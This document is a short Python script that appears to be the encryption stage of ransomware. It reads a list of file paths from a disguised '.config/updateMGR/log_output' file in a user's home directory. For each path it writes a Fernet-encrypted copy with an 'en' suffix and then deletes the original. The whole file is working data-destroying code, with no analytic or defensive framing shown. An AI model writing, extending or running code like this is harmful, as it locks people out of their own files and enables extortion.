#!/usr/bin/env python3
from cryptography.fernet import Fernet
import os
import sys
argument=sys.argv[1][:43]+'='
username=sys.argv[2]
key=bytes(argument, 'utf-8')
fernet = Fernet(key)
####################################################
loc="/home/"+username+"/.config/updateMGR/log_output"
fd= open(loc,mode='r',encoding='utf8', newline='\n')
for i, line in enumerate(fd):
	line=line.rstrip("\n")
	if os.path.exists(line) and os.path.isfile(line):
		with open(line, 'rb') as file:
			original = file.read()
			encrypted = fernet.encrypt(original)
			with open(line+"en", 'wb') as encrypted_file:
				encrypted_file.write(encrypted)
		os.remove(line)
		print(i, line)

